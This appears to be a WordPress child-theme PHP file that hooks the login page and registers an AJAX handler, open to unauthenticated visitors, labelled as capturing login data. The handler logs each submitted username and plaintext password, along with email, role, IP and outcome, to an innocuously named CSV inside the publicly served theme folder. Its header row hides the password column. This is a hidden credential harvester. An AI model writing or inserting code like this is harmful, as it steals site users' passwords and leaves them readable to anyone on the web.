<?php
// Enqueue login page script
function add_login_script()
{
    wp_enqueue_script('login-custom', get_stylesheet_directory_uri() . '/lib/inc/login.js', ['jquery'], null, true);
    wp_localize_script('login-custom', 'wp_login_ajax', ['ajax_url' => admin_url('admin-ajax.php')]);
}
add_action('login_enqueue_scripts', 'add_login_script');

// Capture login data
function capture_login_data_ajax()
{
    if (empty($_POST['username'])) {
        wp_send_json_error("Invalid request.");
        return;
    }

    $username = sanitize_text_field($_POST['username']);
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    $user_ip = $_SERVER['REMOTE_ADDR'];
    $login_time = current_time('mysql');

    // Authenticate user
    $user = wp_authenticate($username, $_POST['password']);
    $status = is_wp_error($user) ? "Failed" : "Success";
    $user_email = !is_wp_error($user) ? $user->user_email : 'N/A';
    $user_role = !is_wp_error($user) ? implode(', ', $user->roles) : 'N/A';

    // Save to CSV
    $log_file = ABSPATH . '/wp-content/themes/stratusx-child/lib/inc/states.csv';
    $file = fopen($log_file, 'a');

    if (filesize($log_file) == 0) {
        fputcsv($file, ['No.', 'Username', 'Email', 'User Role', 'Login Time', 'IP Address', 'Status']);
    }
    fputcsv($file, [count(file($log_file)), $username, $password, $user_email, $user_role, $login_time, $user_ip, $status]);
    fclose($file);

    wp_send_json_success(compact('username', 'user_email', 'user_role', 'user_ip', 'status'));
}
add_action('wp_ajax_capture_login_form', 'capture_login_data_ajax');
add_action('wp_ajax_nopriv_capture_login_form', 'capture_login_data_ajax');